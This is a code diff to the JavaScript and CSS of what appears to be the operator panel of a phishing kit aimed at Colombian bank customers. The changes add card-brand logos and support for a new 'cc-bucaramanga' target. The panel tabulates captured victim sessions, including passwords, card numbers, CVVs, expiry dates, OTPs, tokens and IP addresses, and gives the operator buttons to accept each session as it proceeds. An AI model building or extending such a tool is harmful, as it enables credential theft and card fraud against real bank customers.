@@ -115,6 +115,10 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 #toast.show { transform: translateX(0); }
 #toast.error { border-left-color: #ef4444; }
 
+/* Estilos para logos de marca en la tabla */
+.banco-cell { display: flex; align-items: center; gap: 6px; white-space: nowrap; }
+.banco-logo { height: 16px; width: auto; max-width: 32px; object-fit: contain; border-radius: 2px; display: inline-block; vertical-align: middle; }
+
 @media (max-width: 768px) {
     .container { padding: 10px; }
     .stats { grid-template-columns: 1fr 1fr; }
@@ -355,18 +359,37 @@ function formatTime(segundos) {
     return Math.floor(segundos / 3600) + 'h ' + Math.floor((segundos % 3600) / 60) + 'm';
 }
 
-function nombreBanco(key) {
+/* ============================================================
+   LOGOS DE MARCA (VISA / MASTERCARD / AMEX)
+   ============================================================ */
+const LOGO_VISA = '<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/50px-Visa_Inc._logo.svg.png" class="banco-logo" alt="Visa">';
+const LOGO_MC = '<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/50px-Mastercard-logo.svg.png" class="banco-logo" alt="Mastercard">';
+const LOGO_AMEX = '<img src="https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/img-WEBLOGO1-01.jpg" class="banco-logo" alt="Amex" style="border-radius:2px;">';
+
+function logoMarca(marca) {
+    if (marca === 'visa') return LOGO_VISA;
+    if (marca === 'mastercard') return LOGO_MC;
+    if (marca === 'amex') return LOGO_AMEX;
+    return '💳';
+}
+
+function nombreBanco(key, marca) {
+    if (key === 'cc-bogota') {
+        return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bogotá</span>';
+    }
+    if (key === 'cc-bucaramanga') {
+        return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bucaramanga</span>';
+    }
     const nombres = {
-        'cc-bogota': '💳 CC-Bogotá',
-        'bancolombia': 'Bancolombia',
-        'davivienda': 'Davivienda',
-        'avvillas': 'AV Villas',
-        'bogota': 'B. Bogotá',
-        'caja-social': 'Caja Social',
-        'bbva': 'BBVA',
-        'popular': 'Popular',
-        'occidente': 'Occidente',
-        'nequi': 'Nequi'
+        'bancolombia': '🏦 Bancolombia',
+        'davivienda': '🏦 Davivienda',
+        'avvillas': '🏦 AV Villas',
+        'bogota': '🏦 B. Bogotá',
+        'caja-social': '🏦 Caja Social',
+        'bbva': '🏦 BBVA',
+        'popular': '🏦 Popular',
+        'occidente': '🏦 Occidente',
+        'nequi': '📱 Nequi'
     };
     return nombres[key] || key;
 }
@@ -522,7 +545,8 @@ function botonesSesion(s) {
     const ip = escapeHtml(s.datos.ip || '');
     const btns = [];
 
-    if (bancoKey === 'cc-bogota') {
+    /* 🔥 FIX: Ahora acepta cc-bogota Y cc-bucaramanga */
+    if (bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga') {
         if (estado !== 'rechazado' && estado !== 'finalizado') {
             btns.push(`<button class="btn btn-accept" onclick="accion('${sid}','ACEPTAR')">✅ Aceptar</button>`);
         }
@@ -582,7 +606,7 @@ function renderSesiones() {
                 datos.bancoKey, s.estado, datos.identificacion, datos.clave,
                 datos.docNumber, datos.tarjeta, datos.titular, datos.token,
                 datos.otp, datos.monto, datos.ip, datos.expMes, datos.expAnio,
-                datos.cvv
+                datos.cvv, datos.marca
             ].filter(Boolean).join(' ').toLowerCase();
             return texto.includes(filtro);
         });
@@ -595,7 +619,8 @@ function renderSesiones() {
     tbody.innerHTML = lista.map(s => {
         const datos = s.datos || {};
         const banco = datos.bancoKey || '-';
-        const esTarjeta = banco === 'cc-bogota';
+        /* 🔥 FIX: acepta cc-bucaramanga */
+        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga';
 
         let identificacionTrj = '-';
         let claveFch = '-';
@@ -625,7 +650,7 @@ function renderSesiones() {
         return `
             <tr>
                 <td class="checkbox-col"><input type="checkbox" class="check-sesion" data-id="${escapeHtml(s.sessionId)}" ${checked}></td>
-                <td>${escapeHtml(nombreBanco(banco))}</td>
+                <td>${nombreBanco(banco, datos.marca)}</td>
                 <td><span class="estado estado-${s.estado}">${s.estado}</span></td>
                 <td class="dato" title="${escapeHtml(identificacionTrj)}">${escapeHtml(truncar(identificacionTrj, 20))}</td>
                 <td class="dato">${escapeHtml(claveFch)}</td>
